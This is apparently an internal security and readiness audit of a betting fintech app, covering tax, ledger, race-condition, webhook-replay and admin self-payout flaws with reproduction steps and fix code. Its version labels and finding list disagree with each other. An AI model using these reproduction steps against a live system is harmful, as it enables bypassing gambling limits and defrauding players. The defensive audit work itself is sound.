# 50pick — Final Production Readiness Audit **v2**
## Zero-Compromise Review · Engineering · Design · UX · Accessibility · Compliance

| | |
|---|---|
| **Date** | 15 July 2026 |
| **Version** | v6 — supersedes v5. §15 restructured by the **two-verb test**: FIX the authority, DELETE the noise. |
| **Scope** | 548 TS/TSX · 87,729 LOC · 37 migrations · 57 test suites · Theme Kit · 3 locales · 1,286 i18n keys |
| **Method** | Static analysis + executable proofs. WCAG ratios computed from actual token values. |
| **Verdict** | **DO NOT LAUNCH** — **11** Critical, 11 High, 11 Medium, 6 Low |
| **Estimate** | 5–6 weeks to launch-ready |

---

## How to use this document

Every finding group has a checkbox. Tick when done, send the file back, I re-verify.

```
[ ] not started      [~] in progress      [x] done — awaiting re-verification
```

**Do not tick a Critical without re-running its reproduction steps.**

### What changed in v8 — final
- **New C11 — brand identity split, verified visually.** Your app renders the **new** logo (round 2 "Needle"). Your **PWA home-screen icon and every email** ship the **old** logo (royal ring + "50" numerals + counterweight hub). Two different logos, same product, both in production.
- **§18.5 verdict corrected.** I had listed `public/brand/*.svg` as merely "unused, 51 KB, low value". **All four are the OLD mark** — they are not dead weight, they are *wrong*, and three of them feed shipped PNGs. Not a cleanup item: an identity defect.
- **Brand hexes verified authoritative.** `brand.tsx` `#1EA362`/`#B03A3E`/`#E3BC66` are a **byte-identical 1:1 port** of the delivered `Final logo design/mark-a.svg`. They diverge from theme tokens **by design** — the code comment *"Delivered brand hex is authoritative"* is correct. **Not a finding.**

### What changed in v7
- **All 1,105 files classified.** Not sampled. Import graph resolved from **203 framework entry points** across 548 `.ts/.tsx` files → **exactly 4 unreachable**. Every `public/` asset checked against `manifest.json` **and** `layout.tsx` metadata. Every non-build directory measured.
- **New C10 — `db-check.cjs`.** Committed, unreferenced, at repo root: dumps **raw `nidaNumber`, `fullName`, `email`, `phoneE164`** to stdout. Bypasses every masking control in your reports layer. Found only by classifying root files.
- **`Final UI enhancement Kit` re-verified — I was wrong in v5/v6.** It is **not** a false artifact. Its code **shipped**: `layout.tsx:9-10` imports `state-tokens.css` and `micro-patterns.css`. The kit copies are stale duplicates — live `state-tokens.css` has **51 lines the kit lacks**.
- **False-positive caught:** `mark-white.svg` looked like a build input for `build-logo-png.mjs`. It isn't — the grep matched the substring `mark-white` inside `fiftymark-white`. **The script generates its SVG inline.**
- **§18 — the definitive file verdict.** Every artifact: DELETE / REWRITE / KEEP, with the evidence for each.

### What changed in v6
- **§15 rewritten around one test:** *does this file describe what SHOULD be true (**FIX** it) or what WAS true (**DELETE** it)?* Every artifact classified with a reference count. Nothing deleted on a guess.
- **Delete list is now exact** — 47 files, with the command. Includes 24 badge SVGs (badges are inline React), kit `og/*.svg` (PNGs already shipped), `public/pay/*.svg` (live uses in-house glyphs), `state-tokens.css` (**0/5 tokens merged**; live has its own system).
- **§15.6 DO-NOT-DELETE expanded** — `payment-logo.tsx` is *waiting* on trademarked MNO logos from Ali. That's undelivered work, not noise.

### What changed in v5
- **H13 promoted to C9 — Critical.** This is no longer "stale docs". `CLAUDE.md:39` and `:278` **instruct** engineers to read the superseded kit *"before any color / composition / hero change"* and to *"trust the kit, not the name."* Following that instruction today reverts your brand to **teal** and **resurrects the light theme you deliberately killed**. It is an active instruction to break the product.
- **Three docs claim three different "sources of truth"** — `kit-gap-audit.md` (2026-07-04) says *"build only from the kit; never invent"*; `refinement-spec.md` (2026-07-07) says `design-master-brief.md` is the source; the brief says it *"supersedes ad-hoc notes."* Only the brief matches the build.
- **New §16 — Design requirements audit.** All 35 design docs tested against the build. Verdict per file: BUILT / DEAD / CONTRADICTS.
- **`refinement-spec.md` is a completed worklist, not a requirement** — verified: all 12 Controlled-Poll glyphs built, hero replaced, 20 orphan slides already deleted.

### What changed in v4
- **H3 RETRACTED — I was wrong.** Security headers *do* exist, in `src/proxy.ts`, with a full CSP, HSTS, frame-busting and a correct matcher. Next 16 renamed `middleware.ts` → `proxy.ts`; I grepped the old name and `next.config.ts` and concluded "no headers". **The file was flagged as a dead orphan by my own tooling, which is exactly how I found my error.** See §11.0.
- **New §15 — Repo cleanup: what to delete.** Every recommendation backed by a reference count, not a guess.
- **New M12** — `tsconfig.json` typechecks 4 design-mock `.tsx` files outside `src/`; its `exclude` list names 2 directories that no longer exist.
- Confirmed **only 4 truly dead components** in 548 files. The codebase is genuinely clean.

### What changed in v3
- **M10 promoted to H13** — documentation drift is systemic, not cosmetic. `CLAUDE.md` makes 3 false claims; the `DESIGN_AUTHORITY` doc that justifies the product's biggest design decision **does not exist**.
- **Single-theme confirmed from code** — 0 light selectors, 0 `next-themes` imports, 0 `dark:` variants across 548 files, `color-scheme: dark` forced. The build is right; the docs are wrong.
- **Artifact hierarchy re-derived from code** (§7.0). v2 benchmarked the design system against a *historical snapshot* because `CLAUDE.md` named it "source of truth". Conclusions survived; the basis was wrong.
- **Method change:** every `.md` in this repo is now treated as an unverified claim. The compiled artifact is the spec.

### What v2 added over v1
- **C8** — withdraw UI promises "tax on winnings" in 3 languages while the code taxes principal.
- **H10–H12** — 5 computed WCAG failures, missing skip link, withdraw confirm hides the tax.
- Full design/UX/a11y/i18n audit; corrected v1's unfounded design claims (§11).

---

## Contents

1. [Executive summary](#1-executive-summary)
2. [Findings register](#2-findings-register)
3. [Critical (C1–C8)](#3-critical)
4. [High (H1–H12)](#4-high)
5. [Medium (M1–M11)](#5-medium)
6. [Low (L1–L6)](#6-low)
7. [Design system audit](#7-design-system-audit)
8. [UX flow audit](#8-ux-flow-audit)
9. [Accessibility audit](#9-accessibility-audit)
10. [Verified correct](#10-verified-correct)
11. [Corrections to v1](#11-corrections-to-v1)
12. [Architecture assessment](#12-architecture-assessment)
13. [Remediation plan](#13-remediation-plan)
14. [Launch gate](#14-launch-gate)

---

# 1. Executive summary

## 1.1 The honest headline

This is a **well-engineered, well-designed product** — better than most licensed fintech I've reviewed, and the design work is stronger than the engineering in places.

I need to say that plainly because what follows is severe.

Evidence of real discipline is everywhere. On the engineering side: `Decimal(18,2)`, a double-entry ledger, `@@unique([provider, providerRef])`, DB-level `CHECK (balance >= 0)`, wallet→market lock ordering, ownership re-verified three times in `cashOut`, and settlement **deliberately made resumable**.

On the design side — which I under-audited in v1 and have now corrected — the discipline is if anything **more** impressive:

- The implemented OKLCH tokens match `design-master-brief.md`'s ground-truth sRGB palette to within **0.3%**. `--yes-500: oklch(62% 0.17 152)` vs the brief's computed `62.3 0.167 151.2`. That is not luck; that is somebody converting carefully.
- **1,286 i18n keys across EN/SW/ZH with near-perfect parity** (2 structural keys differ; 5 "identical" strings are correct proper nouns).
- The CJK font stack ends every family with a system fallback **specifically to avoid a multi-MB webfont download on Tanzanian mobile data**. That is thinking about the actual user.
- `prefers-reduced-motion` on every keyframe, **plus** a `data-motion` throttle that detects mid-tier Android via `deviceMemory`/`hardwareConcurrency`/`saveData`.
- The bet confirm modal locks a 10-second quote and warns when the payout ratio is thin. That is a **better** disclosure pattern than most regulated books ship.

The problems cluster into **five themes**:

| Theme | Meaning |
|---|---|
| **Single-instance assumptions** | Audit chain, rate limiter, lock hash: perfect on 1 instance, silently broken on 2. The in-memory dev fallback means your 57 suites *cannot see* this. |
| **Evidence vs. reality** | Money is mostly correct; the *proof* is not durable. `reconcileLedger()` is dead code that couldn't detect the real failure anyway. |
| **Check-then-act races** | RG deposit/loss limits validated *outside* the wallet lock. |
| **Controls relaxed for convenience** | The POCA §16 production hard-lock was deliberately removed 2026-07-12. |
| **UI promises the code doesn't keep** | The withdraw screen states tax applies to *winnings*. The code taxes principal. In three languages. |
| **Docs describe a product that isn't this one — and mandate it** | ← **escalated in v5 (C9).** `CLAUDE.md` doesn't just describe the superseded teal kit; it **instructs** engineers to *"read the kit first"* and *"trust the kit, not the name"* before any colour change. Following your own written process reverts the brand to teal and resurrects the killed light theme. |

## 1.2 The one-line summary

> The system is **correct today**, **unprovable tomorrow**, and **says things that aren't true**. The design system is excellent and largely faithful to its own kit — but it is being used to communicate a tax behaviour the backend does not implement.

## 1.2b One retraction, stated up front

**v1–v3 reported "no security headers" (H3). That was wrong.** All six exist in `src/proxy.ts` — CSP, HSTS, `X-Frame-Options: DENY`, nosniff, Referrer-Policy, Permissions-Policy — with a correct matcher and HSTS properly gated to production. Next 16 renamed `middleware.ts` → `proxy.ts`; I checked the old name and asserted absence.

**Your security posture is better than three versions of this report claimed.** The finding is retracted (§11.0). It was caught only because you asked what to delete — my orphan detector flagged `proxy.ts` as dead, and reading it to confirm deletion revealed the headers. **A cleanup request caught a false security finding.**

## 1.3 What a regulator finds first

1. **C7** — an admin can pay their own bets (production lock removed).
1a. **C10** — a committed script dumps raw NIDA numbers with no auth and **no audit entry**.
1b. **C11** — *(what every user sees)* the home-screen icon and every email carry a logo your own code calls superseded.
1b. **C9** — *(not a regulator finding, but the one your users would see)* your own docs instruct engineers to break the brand.
2. **C8 + C1** — the UI tells players in Swahili that tax applies to winnings; the code takes 15% of their deposit.
3. **C4** — RG deposit/loss limits bypassable by pressing a button twice (GLI-19 / LCCP SR 3.4).
4. **C3** — "reconcile player liability to your ledger." You cannot.

## 1.4 Design verdict — *revised in v5*

**You said design inconsistency annoys Tanzanian users more than losing money. C9 is the mechanism that would introduce it** — not carelessness, but a careful engineer following `CLAUDE.md:278` and reverting royal 268 to teal 215.

Your palette discipline is currently one of the product's **best** attributes (matched to `design-master-brief.md` within **0.3%**). The threat to it is not the design team. It's the documentation.

## 1.4b Design findings

**The Theme Kit is not the problem. Conformance to it is high.** The design findings are:
- 5 **computed** WCAG failures — including the **NO button** (a money control) at 4.02:1 and borders at 1.48:1
- No skip link (WCAG 2.4.1 Level A)
- The withdraw confirm modal shows **gross only** — no tax line, no net
- Deposit has no confirm step while bet and withdraw do

None of these require a redesign. All are token-value or single-component changes.

---

# 2. Findings register

## Critical — launch blockers

| ID | Finding | Module | Theme |
|---|---|---|---|
| **C1** | 15% withholding tax charged on **principal**, not winnings | `payments.ts` | Money |
| **C2** | Bonus **silently destroyed** on market void; ledger says refunded | `bonus-service.ts` | Money |
| **C3** | Ledger fire-and-forget; `reconcileLedger()` dead **and** blind | `ledger.ts` | Evidence |
| **C4** | RG deposit/loss limits bypassable via concurrency | `responsible-gambling.ts` | Race |
| **C5** | Webhook replay bypassed by omitting one header | `webhooks/payments` | Security |
| **C6** | Audit chain forks under multi-instance | `audit.ts` | Single-instance |
| **C7** | POCA §16 override — **production lock deliberately removed** | `test-overrides.ts` | Control |
| **C8** | **UI promises tax on winnings; code taxes principal (EN/SW/ZH)** | `i18n-dict.ts:619` | **Misrepresentation** |
| **C9** | **Docs instruct engineers to build from the superseded teal kit** | `CLAUDE.md:39,278` | **Active mis-instruction** |

## High

| ID | Finding | Module |
|---|---|---|
| **H1** | Stored XSS: proposal title → unescaped JSON-LD | `markets/[id]` |
| **H2** | Rate limiter in-memory: capacity × N instances | `rate-limit.ts` |
| ~~H3~~ | ~~No security headers~~ — **RETRACTED, they exist in `src/proxy.ts`** | — |
| **H4** | `/api/health` full-scans `User` every probe → OOM | `health/route.ts` |
| **H5** | NIDA duplicate check loads **every KYC image in the DB** | `kyc-service.ts:115` |
| **H6** | Zero error monitoring + 118 silent `catch {}` | platform-wide |
| **H7** | Webhook secret env vars mismatched → launch outage | config |
| **H8** | KYC images base64 in Postgres → ~12 TB at 1M players | `kyc-service.ts` |
| **H9** | No CI, no DR runbook, no migration rollback | infra |
| **H10** | **5 computed WCAG contrast failures** (incl. NO button) | `globals.css` |
| **H11** | **No skip link — WCAG 2.4.1 Level A failure** | `app-shell.tsx` |
| **H12** | **Withdraw confirm shows gross only — no tax, no net** | `withdraw-confirm.tsx` |
| ~~H13~~ | *promoted to* **C9** | — |

## Medium

| ID | Finding | Module |
|---|---|---|
| **M1** | 32-bit advisory-lock hash collides across namespaces | `locks.ts` |
| **M2** | Pari-mutuel rounding drift unbudgeted (±61 TZS) | `market-config.ts` |
| **M3** | Missing indexes: `User.role`, `LedgerEntry.userId` | `schema.prisma` |
| **M4** | Webhook never verifies the **amount** | `wallet-service.ts:403` |
| **M5** | `db.user.list()` full-scan at 10 call sites | platform-wide |
| **M6** | Idempotency key regenerated per **render**, not intent | `wallet/*/page.tsx` |
| **M7** | Affiliate `recruitCount` lost-update race (display-only) | `affiliate-service.ts` |
| **M8** | Schema comment contradicts implementation | `schema.prisma:322` |
| **M9** | **Deposit has no confirm step; bet & withdraw do** | `wallet/deposit` |
| ~~M10~~ | *promoted to* **H13** | — |
| **M12** | **`tsconfig` typechecks design mocks; `exclude` names deleted dirs** | `tsconfig.json` |
| **M11** | **`next-themes` is a dead dependency** | `package.json` |

## Low

| ID | Finding | Module |
|---|---|---|
| **L1** | Dead `try/catch` around `Buffer.from(hex)` | `crypto.ts:200` |
| **L2** | `winnersPaid` under-reports after settlement resume | `market-service.ts` |
| **L3** | 50 hardcoded hex colours outside tokens | components |
| **L4** | VOID position claims `finalPayout` when refund forfeited | `market-service.ts` |
| **L5** | **Kit var named `--teal-*` but holds royal-268 hue** | `globals.css` |
| **L6** | **`btn-sm`/icon buttons pass WCAG AA but fail AAA (44px)** | `globals.css` |

---

# 3. Critical

---

## [ ] C1 — Withholding tax charged on principal, not winnings

**Severity:** Critical · **Affected:** `payments.ts:88`, `wallet-service.ts:473,540`
**Root cause:** Correct abstraction defeated at the call site.

```ts
// payments.ts:88 — signature is CORRECT
export function computeWithdrawalTax(amount: number, taxableWinnings: number): number {
  return Math.round(Math.max(0, Math.min(amount, taxableWinnings)) * 0.15);
}

// wallet-service.ts:473 — both arguments are the SAME value
const tax = computeWithdrawalTax(amount, amount);
const net = amount - tax;
// wallet-service.ts:540 — the player really receives `net`
const result = await dispatchWithdrawal({ provider, amount: net, msisdn, userId });
```

The code's own comment admits it: *"naïve: assume entire amount is taxable winnings until we wire bet ledger"*. **Not a TODO — live and deducting money.**

### Reproduce
1. Register, complete KYC. 2. Deposit TZS 100,000. **Place no bets.** 3. Withdraw 100,000.
4. **Expected:** 100,000. **Actual:** 85,000.

### Verified impact

| Scenario | Charged | Lawful | Overcharged |
|---|---|---|---|
| Deposit 100k, never bet, withdraw 100k | 15,000 | 0 | **15,000** |
| Deposit 500k, lost 100k, withdraw 400k | 60,000 | 0 | **60,000** |
| Deposit 100k, won 50k, withdraw 150k | 22,500 | 7,500 | **15,000** |
| Deposit 1M, breakeven, withdraw 1M | 150,000 | 0 | **150,000** |

10,000 players × 200,000 TZS avg principal → **TZS 300,000,000 unlawfully withheld.**

A **losing** player is taxed *most* relative to winnings.

### Fix
```prisma
model Wallet {
  taxableWinningsTzs Decimal @default(0) @db.Decimal(18, 2)
}
```
```ts
// inside withdraw()'s wallet lock:
const taxable = Math.min(amount, w.taxableWinningsTzs);
const tax = computeWithdrawalTax(amount, taxable);
await db.wallet.adjust(w.id, { taxableWinningsTzs: -taxable });
```
Maintain inside the settlement lock (where payouts are already computed) → O(1). Backfill from `Transaction` history.

### Long-term
Confirm the tax basis **in writing with the TRA before launch**. Over-withholding is recoverable; under-withholding is a licence risk. You're doing the former at scale.

### Done when
- [ ] `taxableWinningsTzs` column + backfill migration
- [ ] Maintained inside the settlement lock (not fire-and-forget)
- [ ] Reproduction yields 100,000 received
- [ ] Historical over-withholding quantified; refund plan agreed
- [ ] TRA basis confirmed in writing
- [ ] **C8 copy updated to match** (they must ship together)

---

## [ ] C2 — Bonus silently destroyed on market void (ledger says refunded)

**Severity:** Critical · **Affected:** `bonus-service.ts:407`, `market-service.ts:1429,1504,1520,1653`

```ts
// bonus-service.ts:407
const active = await db.bonusGrant.listActiveByUser(userId);
const target = active[0];
if (!target) return { refundedToBonus: 0 };   // ← refund SILENTLY DROPPED
```
```ts
// market-service.ts:1653 — the caller notices, and just logs it
if (refundedToBonus < r.amount) {
  audit({ action: "bonus.refund_forfeited", payload: { forfeited: r.amount - refundedToBonus } });
}
```
The team **knew**, **audited** it, and never fixed the player-facing loss.

### Reproduce
1. Grant 10,000 bonus, `wagerRequired = 10,000`.
2. Player bets the full 10,000 → wagering met → grant `FULFILLED`, `remainingTzs = 0`.
3. Officer **VOIDS** the market.
4. `refundBonusToActive(10,000)` → `listActiveByUser()` returns `[]` → `{ refundedToBonus: 0 }`.

### Impact
The 10,000 **vanishes** — not in `bonusBalance`, not in `balance`, not in the pool. The bet was voided; the player took **no risk** and should be whole.

**Guaranteed ledger divergence:** line 1520 posts `BONUS_REFUND` to the ledger **before** the wallet refund is attempted at line 1653. **Ledger says refunded. Wallet says destroyed.** C3 means nothing detects it.

### Fix
```ts
let target = active[0];
if (!target) {
  // Money must never evaporate: mint a zero-wagering restitution grant.
  // Zero wagering is correct — the original turnover was already served.
  target = await db.bonusGrant.create({
    userId, walletId: wallet.id, amountTzs: 0, remainingTzs: 0,
    wagerRequiredTzs: 0, wageredTzs: 0, status: "ACTIVE",
    sourceRef: `void-restitution:${randomId(8)}`,
  });
}
```
**And** move the ledger post to *after* the wallet refund succeeds, posting the **actual** amount.

### Done when
- [ ] `refundBonusToActive` never returns less than requested
- [ ] Ledger posted after wallet refund, with actual amount
- [ ] `bonus.refund_forfeited` is unreachable (prove with a test)
- [ ] Historical forfeitures found via audit query; players compensated
- [ ] `bonusBalance == Σ ACTIVE remainingTzs` added to nightly reconciliation

---

## [ ] C3 — The ledger cannot prove itself

**Severity:** Critical · **Affected:** `ledger.ts` + 21 call sites

**(a)** Every ledger write is fire-and-forget: `postLedgerEntries(...).catch(() => {})`.

**(b)** The write is outside the money transaction. `withLock`'s own comment: *"the advisory lock is a coordination semaphore, **not a data-consistency wrapper**."*

**(c)** `reconcileLedger()` is never called — **and could not help if it were**:
```bash
$ grep -rn "reconcileLedger" src scripts | grep -v "ledger.ts:"   # (nothing)
```
It checks *"does each groupId sum to zero?"* — but `postLedgerEntries` **already rejects imbalanced groups before insert**. So it **always returns `imbalanced: []`**. It is structurally incapable of detecting a group **never written at all**. A missing group has no rows; it cannot appear in a `GROUP BY`.

### Reproduce
1. Pause Postgres for 200ms mid-bet so the ledger insert fails.
2. Wallet debited, `Transaction` created, position `OPEN`.
3. `SELECT * FROM "LedgerEntry" WHERE "groupId"='stake_<txnId>'` → **0 rows**.
4. `reconcileLedger()` → `{ imbalanced: [] }` → **reports clean**.

### Impact (simulated against real control flow)
```
Settlement crash at 500/1000:
  Winners credited : 500
  settledAt stamped: NO   (correct — resumable by design)
  Ledger written   : 491  (9 lost, never retried)
```
Lost entries are **permanent** — those positions are now `WIN`, so the resumed run's `status === "OPEN"` filter skips them.

**Credit where due:** the money is correct and resumption genuinely works (payout inputs are immutable post-resolution). This is an **evidence** failure — until C2, where evidence and money diverge for real.

### Missing check
Nothing compares `SUM(LedgerEntry PLAYER:id)` vs `Wallet.balance`.

### Fix
```ts
await pc.$transaction(async (tx) => {
  const d = await tx.wallet.updateMany({
    where: { id: wallet.id, balance: { gte: realPart } },
    data: { balance: { decrement: realPart } },
  });
  if (d.count === 0) throw new InsufficientBalance();
  await tx.transaction.create({ data: {...} });
  await tx.ledgerEntry.createMany({ data: stakeEntries({...}) });  // all or nothing
});
```
```sql
-- Real trial balance
SELECT w."userId", w.balance, COALESCE(SUM(le.amount),0) AS ledger_balance,
       w.balance - COALESCE(SUM(le.amount),0) AS drift
FROM "Wallet" w LEFT JOIN "LedgerEntry" le ON le.account = 'PLAYER:' || w."userId"
GROUP BY w."userId", w.balance
HAVING ABS(w.balance - COALESCE(SUM(le.amount),0)) > 0.005;

SELECT SUM(amount) FROM "LedgerEntry";   -- must be 0
```
Run nightly. Surface on `/admin/finance`. **Alert on any row.**

### Long-term
Promote the ledger to **system of record**; derive `Wallet.balance` from it. Today truth and evidence are inverted.

### Done when
- [ ] Wallet + txn + ledger in one `$transaction` on all money paths
- [ ] `reconcileLedger()` replaced with wallet↔ledger trial balance
- [ ] Global `SUM(amount)=0` + bonus invariant checks
- [ ] Nightly job + alerting + `/admin/finance` surface
- [ ] Reproduction: ledger failure now rolls back the debit

---

## [ ] C4 — RG deposit & loss limits bypassable via concurrency

**Severity:** Critical · **Risk:** GLI-19 / LCCP SR 3.4 · **Affected:** `wallet-service.ts:87` vs `:221`; `market-service.ts:323` vs `:337`

```ts
const limitCheck = await checkDepositLimit(userId, amount);   // line 87  ← OUTSIDE lock
const outcome    = await withLock(`wallet:${userId}`, ...);   // line 221 ← lock starts HERE

const lossCheck = await checkLossLimit(userId, opts.stake);   // line 323 ← OUTSIDE lock
const result    = await withLock(`wallet:${userId}`, ...);    // line 337 ← lock starts HERE
```

### Reproduce
1. `dailyDepositLimit = 100,000`, current total 0.
2. Fire **10 concurrent** deposits of 100,000.
3. All 10 read `dailySum = 0` → all pass → all commit.
4. **Result: 1,000,000 deposited against a 100,000 cap — 10× the cap.**

Same shape for `checkLossLimit`: a self-limited problem gambler blows their loss cap.

**Idempotency does not help** — these are distinct intents with distinct keys.

### Fix
Move the check **inside** the lock. The lock already exists; it starts too late.
```ts
const outcome = await withLock(`wallet:${userId}`, async () => {
  const limitCheck = await checkDepositLimit(userId, amount);   // re-read inside lock
  if (!limitCheck.allowed) {
    audit({ category: "COMPLIANCE", action: "deposit.rg_limit_blocked", ... });
    return { ok: false, error: limitCheck.reason, code: "INVALID" };
  }
  // ... existing credit logic
});
```
**This is exactly the pattern `buyPosition` already uses** for idempotency and `closedInFlight`. The precedent is in your own code.

**Also:** `sumDepositsSince` must include **`PROCESSING`** deposits, or 10 concurrent *async* mobile-money deposits each see 0 even under the lock.

### Better
A `DailyDepositTotal` table with unique `(userId, date)` and an atomic conditional `UPDATE ... WHERE total + :amt <= limit` — the DB refuses the over-limit deposit; no application race can defeat it.

### Impact if unresolved
A self-limited problem gambler deposits 10× their cap. If that player later self-harms and the limit is shown defeatable by double-tapping, this is **the most serious finding here in human terms**, and an existential licence event.

### Done when
- [ ] `checkDepositLimit` re-checked inside `withLock`
- [ ] `checkLossLimit` re-checked inside `withLock`
- [ ] `sumDepositsSince` includes `PROCESSING`
- [ ] 10 parallel deposits vs 100k cap → exactly 1 succeeds
- [ ] Test added to `scripts/concurrency.test.mts`

---

## [ ] C5 — Webhook replay bypassed by omitting one header

**Severity:** Critical · **Affected:** `crypto.ts:206`, `webhooks/payments/route.ts:43`

```ts
if (opts.timestamp) {   // ← only checked IF present
  ...stale-timestamp rejection...
}
return { valid: true };
```
```ts
const timestamp = req.headers.get("x-timestamp") ?? undefined;   // ← attacker controls this
```

### Verified
```
TEST 1: 5-year-old replay WITH timestamp  -> {"valid":false,"reason":"stale-timestamp"}  ✓
TEST 2: SAME replay, OMIT X-Timestamp     -> {"valid":true}                              ✗
```

### Honest impact
**Substantially mitigated.** `settlePaymentWebhook` is status-gated (`if (txn.status !== "PROCESSING") return`), so a replayed deposit confirmation is a **no-op**. **No double-credit.** Idempotency saves you.

Real risk is **state-transition abuse**: replaying a captured `FAILED` against a *different* `PROCESSING` txn, or a stale `CONFIRMED` to force a withdrawal you meant to cancel.

**Still Critical** — defence-in-depth failure on the money rail, trivially exploitable, one refactor from a double-credit.

### Fix
```ts
if (!opts.timestamp) return { valid: false, reason: "missing-timestamp" };
// ... skew check ...
// Sign OVER the timestamp so it can't be stripped (Stripe's construction):
const expectedMac = createHmac("sha256", opts.secret)
  .update(`${opts.timestamp}.${opts.body}`, "utf8").digest();
```
```prisma
model WebhookNonce {
  provider String; signature String; receivedAt DateTime @default(now())
  @@unique([provider, signature])
}
```

### Done when
- [ ] Timestamp mandatory; missing → 401
- [ ] Signature over `timestamp.body`
- [ ] Nonce table + pruning
- [ ] Amount verification (M4)
- [ ] Reproduction → 401

---

## [ ] C6 — Audit chain forks under multi-instance

**Severity:** Critical · **Affected:** `audit.ts:232-254`, `schema.prisma:653`

```ts
const prev = ring[ring.length - 1];        // ← per-process memory
ring.push(stamped);
void persist(stamped);                     // ← fire-and-forget; crash loses it PERMANENTLY
```
```prisma
prevHash   String @default("GENESIS")   // ← NOT unique
entryHash  String @unique
```

### Reproduce
1. Deploy 2+ instances. 2. Concurrent audited actions on different instances.
3. `SELECT "prevHash", COUNT(*) FROM "AuditLog" GROUP BY "prevHash" HAVING COUNT(*)>1;` → **fork**.
4. Restart → `hydrate()` picks one branch → **the other silently disappears**.
5. `verifyChain()` → `valid: true` **on a truncated chain**.

### Why Critical
It **silently degrades**. One instance: perfect. Two: the tamper-evident log stops being tamper-evident **while still reporting that it is**.

### Fix
```sql
SELECT pg_advisory_xact_lock(50, 999);
INSERT INTO "AuditLog" (..., "prevHash", "entryHash")
SELECT ..., COALESCE((SELECT "entryHash" FROM "AuditLog" ORDER BY "createdAt" DESC, id DESC LIMIT 1),'GENESIS'), $9;
```
1. **`await persist()`** — fail closed for money/compliance actions.
2. `@@unique([prevHash])` — forks become a **DB error**.
3. Ring = read cache only.

### Long-term
Anchor a daily Merkle root externally (S3 Object Lock). Today anyone with DB write access can rewrite history and re-chain it; the HMAC secret is in the same environment.

### Done when
- [ ] Chain head selected + inserted atomically in SQL
- [ ] `@@unique([prevHash])` migration
- [ ] `await persist()`; audit failure fails the money operation
- [ ] 2-instance test: no fork
- [ ] Daily Merkle root anchored externally

---

## [ ] C7 — POCA §16 override: production hard-lock deliberately removed

**Severity:** Critical · **Affected:** `test-overrides.ts`, `market-service.ts:1186,1194,1248,1251`

From `test-overrides.ts`, **verbatim**:

> *"The old `NODE_ENV === "production"` hard-lock that used to enforce this was **removed 2026-07-12 at the operator's request** ... the not-for-production rule now lives **in docs + audit trail instead of a code gate**, so re-check it is OFF before go-live."*

It relaxes **both** controls:
```ts
if (!testingResolveOverride) { return { ok:false, code:"CONFLICT" }; }              // :1194 conflict block
if (m.resolutionStage1By === opts.officerId && !testingResolveOverride) { ... }     // :1248 two-officer rule
```
`allowConflictedResolution` is a **persisted `SystemConfig` flag** — survives restarts and deploys.

### Reproduce
1. Admin toggles `allowConflictedResolution = true` (2FA-gated — they have 2FA).
2. Admin bets 5,000,000 YES on a market they will resolve.
3. Admin resolves YES — bypassing conflict block **and** self-countersign.
4. Admin pays themselves from the player pool. 5. Toggles it back off.

**Single actor. No collusion.** Audited — but **detection ≠ prevention**.

### Fix — restore the lock. Non-negotiable.
```ts
export async function getConflictedResolutionAllowed(): Promise<boolean> {
  // POCA §16 / GBT: an officer with a financial interest must NEVER resolve.
  // Evaluation-only. UNCONDITIONALLY disabled in production. Do not remove again.
  if (process.env.NODE_ENV === "production") return false;
  await ensureHydrated();
  return store.allowConflictedResolution;
}
```
```ts
// Boot assertion
if (process.env.NODE_ENV === "production" && (await getTestOverrides()).allowConflictedResolution) {
  throw new Error("FATAL: allowConflictedResolution ON in production. POCA §16. Refusing to start.");
}
```
If consultants need it, the answer is a **separate staging deployment** with `NODE_ENV !== "production"` — **not removing the guard from the code that will handle real money.**

### Better
Delete the override; give testers a **seeded second officer**. The two-officer rule is then *exercised* rather than bypassed — a better test.

### Long-term
**Compliance controls are never relaxed by configuration in production.** A control that can be toggled off is not a control; it's a suggestion.

### Done when
- [ ] `NODE_ENV === "production"` hard-lock restored
- [ ] Boot assertion refusing to start with flag ON
- [ ] Separate staging deployment for evaluation
- [ ] Prod DB verified: `allowConflictedResolution = false`
- [ ] Audit query: zero historical conflicted resolutions
- [ ] Team rule documented

---

## [ ] C8 — **NEW** · UI promises tax on winnings; code taxes principal (EN/SW/ZH)

| | |
|---|---|
| **Severity** | Critical |
| **Risk** | Consumer-protection / misrepresentation at point of sale |
| **Affected** | `src/lib/i18n-dict.ts:619, 1764, 2908` + `wallet/withdraw/page.tsx:153` |
| **Root cause** | Copy describes the *intended* design; code implements a placeholder |

### What is wrong

The withdraw screen renders `taxNotice` / `taxBody` (`page.tsx:153`). The copy, in all three languages:

```
EN: "Tanzania withholds tax on declared WINNINGS at withdrawal per the
     Income Tax Act (Cap 332). The receipt screen shows the net amount."
SW: "Tanzania inakata kodi kwenye USHINDI unaotangazwa wakati wa kutoa..."
     (ushindi = winnings)
ZH: "坦桑尼亚根据所得税法（Cap 332）在提现时对已申报奖金代扣税款。"
     (奖金 = winnings)
```

The code (C1) taxes the **full withdrawal amount**.

### Why this is separately Critical

C1 is a bug. **C8 is the product affirmatively telling the player the opposite of what it does** — and citing a statute while doing so.

Player journey:
1. Deposits 100,000. Never bets. **Has no winnings.**
2. Opens Withdraw. Reads: *"tax on declared winnings."*
3. Reasonably concludes: *"I have no winnings → no tax."*
4. Withdraws 100,000. **Receives 85,000.**

The UI didn't merely fail to warn — **it stated the opposite, in the language most Tanzanian players read**, and pointed at Cap 332 for authority. *"The receipt screen shows the net amount"* means they discover it **after** the money is gone.

Compounded by **H12**: the confirm modal shows **gross only**, so there is no point in the flow where the true net is shown before commitment.

### Reproduce
1. Set locale to Swahili. 2. Deposit 100,000, no bets. 3. Open `/wallet/withdraw`.
4. Read the tax notice → states tax applies to *ushindi* (winnings).
5. Withdraw 100,000 → receive 85,000.

### Fix
**Ship with C1 — they are one change.** Once tax is computed on real winnings, the existing copy becomes **true**.

If C1 slips, the copy **must** change first, and the confirm modal must show the deduction:
```
EN: "Tanzania withholds 15% tax at withdrawal per the Income Tax Act (Cap 332).
     You will receive {net}."
```
Shipping the current copy with the current code is not defensible.

### Long-term
Add a CI check binding money-behaviour copy to the code that implements it: if `computeWithdrawalTax`'s call signature changes, the tax copy keys must be reviewed. Copy that describes money behaviour is **part of the money path**.

### Impact if unresolved
Consumer-protection exposure for a misleading statement at point of sale, in three languages, citing a statute. A regulator reading the Swahili copy next to the code sees the platform telling players one thing and doing another. That reframes every other finding from "immature" to "not candid."

### Done when
- [ ] C1 shipped, making the existing copy true — **or** copy corrected first
- [ ] Confirm modal shows tax + net before commitment (**H12**)
- [ ] EN/SW/ZH reviewed together by someone who reads Swahili
- [ ] CI check binding tax copy to tax code
- [ ] Legal review of the final wording

---

